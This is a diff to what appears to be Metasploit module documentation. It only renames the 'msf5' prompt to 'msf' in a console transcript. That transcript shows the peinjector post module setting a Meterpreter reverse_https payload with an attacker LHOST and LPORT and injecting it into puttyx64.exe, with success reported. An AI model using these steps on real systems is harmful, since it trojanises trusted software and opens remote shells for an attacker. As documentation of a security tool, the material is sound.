@@ -49,8 +49,8 @@ Logged On Users : 2
 Meterpreter     : x64/windows
 meterpreter > background
 [*] Backgrounding session 1...
-msf5 exploit(multi/handler) > use post/windows/manage/peinjector 
-msf5 post(windows/manage/peinjector) > show options
+msf exploit(multi/handler) > use post/windows/manage/peinjector 
+msf post(windows/manage/peinjector) > show options
 
 Module options (post/windows/manage/peinjector):
 
@@ -63,17 +63,17 @@ Module options (post/windows/manage/peinjector):
    SESSION                                      yes       The session to run this module on.
    TARGETPE                                     no        Path of the target executable to be injected
 
-msf5 post(windows/manage/peinjector) > set lhost 192.168.135.111
+msf post(windows/manage/peinjector) > set lhost 192.168.135.111
 lhost => 192.168.135.111
-msf5 post(windows/manage/peinjector) > set lport 4561
+msf post(windows/manage/peinjector) > set lport 4561
 lport => 4561
-msf5 post(windows/manage/peinjector) > set payload windows/x64/meterpreter/reverse_https
+msf post(windows/manage/peinjector) > set payload windows/x64/meterpreter/reverse_https
 payload => windows/x64/meterpreter/reverse_https
-msf5 post(windows/manage/peinjector) > set session 1
+msf post(windows/manage/peinjector) > set session 1
 session => 1
-msf5 post(windows/manage/peinjector) > set targetpe 'C:\users\msfuser\downloads\puttyx64.exe'
+msf post(windows/manage/peinjector) > set targetpe 'C:\users\msfuser\downloads\puttyx64.exe'
 targetpe => C:\users\msfuser\downloads\puttyx64.exe
-msf5 post(windows/manage/peinjector) > show options
+msf post(windows/manage/peinjector) > show options
 
 Module options (post/windows/manage/peinjector):
 
@@ -86,13 +86,13 @@ Module options (post/windows/manage/peinjector):
    SESSION   1                                        yes       The session to run this module on.
    TARGETPE  C:\users\msfuser\downloads\puttyx64.exe  no        Path of the target executable to be injected
 
-msf5 post(windows/manage/peinjector) > run
+msf post(windows/manage/peinjector) > run
 
 [*] Running module against WIN10X64-1511
 [*] Generating payload
 [*] Injecting Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet) into the executable C:\users\msfuser\downloads\puttyx64.exe
 [+] Successfully injected payload into the executable: C:\users\msfuser\downloads\puttyx64.exe
 [*] Post module execution completed
-msf5 post(windows/manage/peinjector) >
+msf post(windows/manage/peinjector) >
 ```
 
